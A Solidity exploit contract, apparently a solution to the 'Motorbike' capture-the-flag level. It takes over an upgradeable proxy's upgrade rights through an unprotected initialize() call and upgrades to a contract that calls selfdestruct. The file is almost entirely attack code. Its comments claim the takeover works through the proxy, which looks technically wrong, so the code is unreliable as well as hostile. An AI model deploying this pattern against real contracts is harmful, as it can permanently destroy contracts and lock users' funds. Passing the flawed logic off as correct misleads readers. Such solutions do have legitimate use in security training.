// SPDX-License-Identifier: Unlicense
pragma experimental ABIEncoderV2;
pragma solidity <0.7.0;

import "../../src/Motorbike/Motorbike.sol";
import "../../exploits/BlockUtils.sol";

contract MaliciousContract {
    function killed() external {
        selfdestruct(address(0));
    }
}

contract MotorbikeExploit is BlockUtils {

    Motorbike motorbike;

    MaliciousContract malicious;

    constructor(address _victim) public {
        motorbike = Motorbike(payable(_victim));
        malicious = new MaliciousContract();
    }

    function hack() public {
        // Step 1: Call initialize via the proxy to set 'upgrader' in proxy's storage to our address
        (bool success1, ) = address(motorbike).call(abi.encodeWithSignature("initialize()"));
        require(success1, "Initialize call failed");

        // Step 2: Call upgradeToAndCall via the proxy, setting the implementation to our 'malicious' contract, and calling 'killed()'
        (bool success2, ) = address(motorbike).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(malicious),
                abi.encodeWithSignature("killed()")
            )
        );
        require(success2, "UpgradeToAndCall failed");
    }

    receive() external payable {
    }
}